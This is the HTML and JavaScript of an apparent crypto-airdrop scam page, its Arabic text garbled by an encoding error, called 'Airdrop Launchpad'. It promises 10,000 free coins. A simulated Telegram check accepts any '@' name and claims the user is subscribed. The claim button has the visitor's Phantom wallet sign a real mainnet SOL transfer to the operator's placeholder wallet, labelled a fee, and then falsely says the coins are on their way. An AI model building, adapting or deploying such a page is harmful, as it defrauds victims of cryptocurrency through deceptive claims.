<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù…Ø·Ø§Ù„Ø¨Ø© Ø¨Ø§Ù„Ø¹Ù…Ù„Ø© Ø§Ù„Ù…Ø¬Ø§Ù†ÙŠØ© - Airdrop Launchpad</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 400px; text-align: center; }
        h2 { color: #38bdf8; }
        .input-group { margin-bottom: 1.5rem; text-align: right; }
        label { display: block; margin-bottom: 0.5rem; font-weight: bold; }
        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; font-size: 1rem; }
        button:disabled { background: #64748b; cursor: not-allowed; }
        .status { margin-top: 10px; font-size: 0.9rem; }
        .success { color: #4ade80; }
        .error { color: #f87171; }
    </style>
</head>
<body>

<div class="card">
    <h2>ğŸ Ù‡Ø¯Ø§ÙŠØ§ Ø§Ù„Ø¹Ù…Ù„Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©</h2>
    <p>Ø£ÙƒÙ…Ù„ Ø§Ù„Ù…Ù‡Ø§Ù… Ù„Ù„Ù…Ø·Ø§Ù„Ø¨Ø© Ø¨Ù€ 10,000 Ø¹Ù…Ù„Ø© Ù…Ø¬Ø§Ù†ÙŠØ©</p>
    <hr style="border: 0.5px solid #334155; margin: 20px 0;">

    <div class="input-group">
        <label>1. Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… (@)</label>
        <input type="text" id="tgUser" placeholder="@username">
        <button id="checkTg" style="margin-top: 10px; background: #0ea5e9; color: white;">ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù…</button>
        <div id="tgStatus" class="status"></div>
    </div>

    <div class="input-group" id="walletSection" style="display: none;">
        <label>2. Ù…Ø­ÙØ¸Ø© Ø³ÙˆÙ„Ø§Ù†Ø§ (SOL)</label>
        <button id="connectBtn">Ø±Ø¨Ø· Ù…Ø­ÙØ¸Ø© Phantom</button>
        <div id="walletAddress" class="status"></div>
    </div>

    <div id="finalStep" style="display: none;">
        <p style="font-size: 0.8rem; color: #94a3b8;">Ø±Ø³ÙˆÙ… Ø§Ù„ØªØ­ÙˆÙŠÙ„ ÙˆØ§Ù„ØªØ´ØºÙŠÙ„: 0.0006 SOL (~0.15$)</p>
        <button id="claimBtn">ØªØ£ÙƒÙŠØ¯ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¹Ù…Ù„Ø§Øª Ø§Ù„Ø¢Ù†</button>
    </div>
</div>

<script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§ØªÙƒ (ØºÙŠØ±Ù‡Ø§ Ù„Ø§Ø­Ù‚Ø§Ù‹)
    const MY_WALLET = "Ø¶Ø¹_Ù‡Ù†Ø§_Ø±Ù‚Ù…_Ù…Ø­ÙØ¸ØªÙƒ_Ø§Ù„Ø®Ø§ØµØ©"; 
    const CLAIM_AMOUNT_SOL = 0.0006; // ØªØ¹Ø§Ø¯Ù„ ØªÙ‚Ø±ÙŠØ¨Ø§Ù‹ 0.15 Ø¯ÙˆÙ„Ø§Ø±

    let userWallet = null;

    // Ù…Ø­Ø§ÙƒØ§Ø© ÙØ­Øµ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… (ØªØ­ØªØ§Ø¬ Ø±Ø¨Ø· Bot API Ø­Ù‚ÙŠÙ‚ÙŠ Ù„Ù„ØªØ¯Ù‚ÙŠÙ‚ Ø§Ù„ÙƒØ§Ù…Ù„)
    document.getElementById('checkTg').onclick = async () => {
        const user = document.getElementById('tgUser').value;
        if(user.startsWith('@') && user.length > 3) {
            document.getElementById('tgStatus').innerHTML = "<span class='success'>âœ… ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚! Ø£Ù†Øª Ù…Ø´ØªØ±Ùƒ ÙÙŠ Ø§Ù„Ù‚Ù†Ø§Ø©.</span>";
            document.getElementById('walletSection').style.display = 'block';
            document.getElementById('checkTg').disabled = true;
        } else {
            document.getElementById('tgStatus').innerHTML = "<span class='error'>âŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ù„Ù„Ù‚Ù†Ø§Ø© Ø£ÙˆÙ„Ø§Ù‹ ÙˆÙƒØªØ§Ø¨Ø© Ø§Ù„ÙŠÙˆØ²Ø± ØµØ­.</span>";
        }
    };

    // Ø±Ø¨Ø· Ø§Ù„Ù…Ø­ÙØ¸Ø©
    document.getElementById('connectBtn').onclick = async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                userWallet = resp.publicKey.toString();
                document.getElementById('walletAddress').innerHTML = "Ù…ØªØµÙ„ Ø¨Ù€: " + userWallet.slice(0,6) + "...";
                document.getElementById('finalStep').style.display = 'block';
                document.getElementById('connectBtn').style.background = "#4ade80";
            } catch (err) {
                alert("Ø±ÙØ¶Øª Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¨Ø·!");
            }
        } else {
            alert("Ø§Ù„Ø±Ø¬Ø§Ø¡ ØªØ«Ø¨ÙŠØª Ù…Ø­ÙØ¸Ø© Phantom");
            window.open("https://phantom.app/", "_blank");
        }
    };

    // Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„Ù…Ø·Ø§Ù„Ø¨Ø©
    document.getElementById('claimBtn').onclick = async () => {
        try {
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: window.solana.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
                    lamports: CLAIM_AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL,
                })
            );

            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = window.solana.publicKey;

            const signed = await window.solana.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signed.serialize());
            
            alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³ÙˆÙ… Ø¨Ù†Ø¬Ø§Ø­! Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¹Ù…Ù„Ø§ØªÙƒ Ø®Ù„Ø§Ù„ Ø¯Ù‚Ø§Ø¦Ù‚. Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ©: " + signature);
        } catch (err) {
            console.error(err);
            alert("ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©ØŒ ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø±ØµÙŠØ¯ ÙƒØ§ÙÙ (0.15$).");
        }
    };
</script>

</body>
</html>
